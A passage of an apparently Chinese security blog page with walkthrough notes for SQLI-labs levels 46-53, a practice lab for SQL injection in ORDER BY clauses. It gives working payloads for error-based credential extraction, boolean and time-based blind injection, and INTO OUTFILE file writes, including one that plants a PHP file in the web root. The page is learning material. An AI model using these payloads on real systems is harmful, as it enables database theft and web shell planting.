+	srcset="/p/cjxjnagt/08_hub32601959b2f1015502423808c4dcadc_35266_480x0_resize_box_3.png 480w, /p/cjxjnagt/08_hub32601959b2f1015502423808c4dcadc_35266_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-46"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="491"
+		data-flex-basis="1180px"
+	
+></p>
+<h4 id="爆users表的数据">爆<code>users</code>表的数据</h4>
+<p><code>?sort=1 and updatexml(1,concat('~',(select concat_ws('~',id,username,password)from security.users limit 0,1)),0)</code>
+<img src="/p/cjxjnagt/09.png"
+	width="1196"
+	height="332"
+	srcset="/p/cjxjnagt/09_hu849853bdef80ca955edbfb0742958f8c_31052_480x0_resize_box_3.png 480w, /p/cjxjnagt/09_hu849853bdef80ca955edbfb0742958f8c_31052_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-46"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="360"
+		data-flex-basis="864px"
+	
+></p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>数据库第 1 位为：s</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">rand</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">rand</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;s&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">rand</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;sd&#39;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">rand</span><span class="p">(</span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;se&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="延时盲注">延时盲注</h3>
+<p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">rand</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">114</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="n">rand</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">115</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="into-outfile">into outfile</h3>
+<p><strong>将查询结果导入到文件中</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s2">&#34;D:/phpstudy_pro/WWW/sqli.pl/Less-46/less46.txt&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果导入不成功的话，很可能是因为 Web 目前 MySQL 没有读写权限造成的。</p>
+<p><strong>利用导出文件 getshell</strong>：</p>
+<p>注入天书里面提供了 lines terminated by 姿势用于 order by 的情况来 getsgell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?sort=1 into outfile &#34;D:/phpstudy_pro/WWW/sqli.pl/Less-46/shell.php&#34; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>3c3f70687020706870696e666f28293b3f3e 是 <code>&lt;php phpinfo();&gt;</code> 的十六进制编码。</p>
+<p>来查看下写入的文件内容是啥样子的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">1	Dumb	Dumb&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;2	Angelina	I-kill-you&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;3	Dummy	p@ssword&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;4	secure	crappy&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;5	stupid	stupidity&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;6	superman	genious&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;7	batman	mob!le&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;8	admin	admin&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;9	admin1	admin1&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;10	admin2	admin2&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;11	admin3	admin3&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;12	dhakkan	dumbo&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;14	admin4	admin4&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;15	hello	world&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器访问测试看看：</p>
+<p><img src="/p/cjxjnagt/10.png"
+	width="1763"
+	height="666"
+	srcset="/p/cjxjnagt/10_hue598df43b39c8703e3d6977080673666_74582_480x0_resize_box_3.png 480w, /p/cjxjnagt/10_hue598df43b39c8703e3d6977080673666_74582_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Less-46"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="635px"
+	
+></p>
+<h2 id="less-47">Less-47</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>ORDER BY '$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">sort</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(&#39;</span><span class="o">~</span><span class="s1">&#39;,(select concat_ws(&#39;</span><span class="o">~</span><span class="s1">&#39;,id,username,password)from security.users limit 0,1)),0) --+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-48">Less-48</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-46 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p>
+<h2 id="less-49">Less-49</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>ORDER BY '$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，这里不再过多演示了。</p>
+<h2 id="less-50">Less-50</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。堆叠注入的话这里不再演示，详细细节可以参考 Less-38 的堆叠注入的姿势。</p>
+<h2 id="less-51">Less-51</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY '$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p>
+<h2 id="less-52">Less-52</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY $id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
+<h2 id="less-53">Less-53</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注、堆叠注入</td>
+<td><code>ORDER BY '$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a>
+        
+            <a href="/tags/sqlilab/">sqlilab</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/5b8yxplu/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg" loading="lazy" data-key="5b8yxplu" data-hash="https://w.wallhaven.cc/full/x6/wallhaven-x696dv.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQLI labs 靶场笔记之进阶挑战 54-65 关</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ojwgoapt/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg" loading="lazy" data-key="ojwgoapt" data-hash="https://w.wallhaven.cc/full/1p/wallhaven-1p28eg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQLI labs 靶场笔记之高级注入姿势 21-37 关</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/gkoe77ij/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png" loading="lazy" data-key="gkoe77ij" data-hash="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQLI labs 靶场笔记之基础挑战 1-20 关</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/yyvork8r/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png" loading="lazy" data-key="yyvork8r" data-hash="https://w.wallhaven.cc/full/2y/wallhaven-2yop8y.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入学习之MYSQL报错注入</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/wto41ytz/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" data-key="wto41ytz" data-hash="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入学习之MYSQL盲注</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="360rce/blog-comment"
+        issue-term="pathname"
+        
+        label="utterances"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
+    </section>
+    <i class="powerby">
+    <span id="busuanzi_container_site_pv">
+        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
+    </span>&nbsp;
+    <span id="busuanzi_container_site_uv">
+        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </i>
+
+
+</footer>
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+    </body>
+</html>
